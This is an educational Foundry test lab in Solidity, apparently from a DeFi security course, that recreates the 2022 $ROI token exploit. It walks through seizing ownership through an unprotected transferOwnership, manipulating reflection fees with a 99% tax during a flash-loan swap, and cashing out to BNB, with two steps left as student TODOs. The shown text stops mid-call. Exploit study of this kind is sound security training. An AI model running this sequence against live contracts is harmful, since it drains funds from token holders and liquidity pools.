...
/*
Lab: Ragnarok Online Invasion ($ROI) Access Control Exploit

Background:
- Date: September 8, 2022
- Impact: 158 BNB (~$44,000) stolen
- Root Cause: Missing access control on transferOwnership function

Key Learning Points:
1. Understanding access control importance
2. How missing modifiers can be exploited

Instructions:
1. Read the comments carefully
2. Fill in the marked TODOs
3. Run `forge test --match-contract ROI_test -vvv` to check your implementation. 
    You should see end balance with 168 BNB (a large jump) if you have successfully exploited the contract.
*/
...
contract ROI_test is Test {
    ...
    function testExploit() public {
        ...
        // Document the starting state to understand token economics
        console.log("----------------------------------------------------");
        console.log("Initial State Before Manipulation:");
        emit log_named_decimal_uint("\tTotal Supply:", ROI.totalSupply(), 9);
        emit log_named_decimal_uint("\tTotal Fees:", ROI.totalFees(), 9);

        // STEP 2: Acquire Initial Position
        // Need some ROI tokens to setup the attack and manipulate liquidity
        console.log("----------------------------------------------------");
        ...
        // Swap through BUSD for higher liquidity path
        pancakeRouter.swapETHForExactTokens{value: 5 ether}(111_291_832_999_209, path, address(this), block.timestamp);
        ...
        // STEP 3: Exploit the missing access control
        // TODO Exercise 1: Call transferOwnership to take control
        // Hint: The function has no access control - anyone can call it!
        // YOUR CODE HERE

        // Remove all fees initially to manipulate token freely
        ROI.setTaxFeePercent(0);
        ROI.setBuyFee(0, 0);
        ROI.setSellFee(0, 0);
        ROI.setLiquidityFeePercent(0);

        // STEP 4: Reflection Manipulation Setup
        // Track reflection state before manipulation
        console.log("State Before excludeFromReward:");
        emit log_named_decimal_uint("\tROI balance:", ROI.balanceOf(address(this)), 9);
        uint256 reflectionAmount = ROI.reflectionFromToken(ROI.balanceOf(address(this)), false);
        emit log_named_uint("\tReflection amount for balance:", reflectionAmount);

        // Exclude holders from reward to manipulate reflection mechanics
        // This prevents them from receiving reflection rewards during the attack
        ...
        console.log("State After excludeFromReward:");
        emit log_named_decimal_uint("\tROI balance:", ROI.balanceOf(address(this)), 9);
        reflectionAmount = ROI.reflectionFromToken(ROI.balanceOf(address(this)), false);
        emit log_named_uint("\tReflection amount after exclude:", reflectionAmount);

        // STEP 5: Position Setup
        // Keep 100k tokens to generate large fee collection
        ...
        ROI.transfer(address(busdroiPair), ROI_bal - 100_000e9);
        console.log("----------------------------------------------------");

        // STEP 6: Fee Collection via Flash Loan
        // Track state before massive fee collection
        console.log("Before Flash Loan with 99% Tax:");
        emit log_named_decimal_uint("\tROI balance of attacker:", ROI.balanceOf(address(this)), 9);
        ...
        emit log_named_decimal_uint("\tTotal Fees:", ROI.totalFees(), 9);
        reflectionAmount = ROI.reflectionFromToken(ROI.balanceOf(address(this)), false);
        emit log_named_uint("\tReflection amount before flash loan:", reflectionAmount);

        // STEP 7: Execute flash loan with high fees
        // TODO Exercise 2: Set a very high tax fee (99%) to collect fees during flash loan
        // Hint: Use setTaxFeePercent()
        // YOUR CODE HERE

        // Execute flash loan which will trigger fee collection in the callback
        busdroiPair.swap(4_343_012_692_003_417, 0, address(this), "3030");

        // STEP 7: Track Post-Fee Collection State
        console.log("After Flash Loan (Before includeInReward):");
        emit log_named_decimal_uint("\tROI balance of attacker:", ROI.balanceOf(address(this)), 9);
        emit log_named_decimal_uint("\tBUSD balance of attacker:", busd.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("\tROI balance of BUSD/ROI Pair:", ROI.balanceOf(address(busdroiPair)), 9);
        emit log_named_decimal_uint("\tBUSD balance of BUSD/ROI Pair:", busd.balanceOf(address(busdroiPair)), 18);
        emit log_named_decimal_uint("\tTotal Fees:", ROI.totalFees(), 9);
        reflectionAmount = ROI.reflectionFromToken(ROI.balanceOf(address(this)), false);
        emit log_named_uint("\tReflection amount after flash loan:", reflectionAmount);

        // STEP 8: Critical Fee Claim
        console.log("----------------------------------------------------");
        console.log("Executing Critical State Changes:");
        // Remove tax before claiming fees
        ROI.setTaxFeePercent(0);

        console.log("Before includeInReward:");
        emit log_named_decimal_uint("\tNominal Balance:", ROI.balanceOf(address(this)), 9);
        reflectionAmount = ROI.reflectionFromToken(ROI.balanceOf(address(this)), false);
        emit log_named_uint("\tReflection amount before include:", reflectionAmount);

        // includeInReward grants access to collected fees
        ROI.includeInReward(address(this));

        /* 
        function balanceOf(address account) public view override returns (uint256) {
            if (_isExcluded[account]) return _tOwned[account];
            return tokenFromReflection(_rOwned[account]); // <-- Uses reflection balance
        }
        */
        console.log("After includeInReward:");
        emit log_named_decimal_uint("\tNominal Balance:", ROI.balanceOf(address(this)), 9);
        reflectionAmount = ROI.reflectionFromToken(ROI.balanceOf(address(this)), false);
        emit log_named_uint("\tReflection amount after include:", reflectionAmount);

        // STEP 9: Convert Claimed Fees to BNB
        busdroiPair.sync();
        path[0] = address(ROI);
        path[2] = address(wbnb);
        ...
        console.log("----------------------------------------------------");
        console.log("Executing Final Swap with Claimed Fees:");
        emit log_named_decimal_uint("\tStarting BNB Balance:", address(this).balance, 18);

        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            3_986_806_268_542_825,
            0,
            path,
            address(this),
            block.timestamp
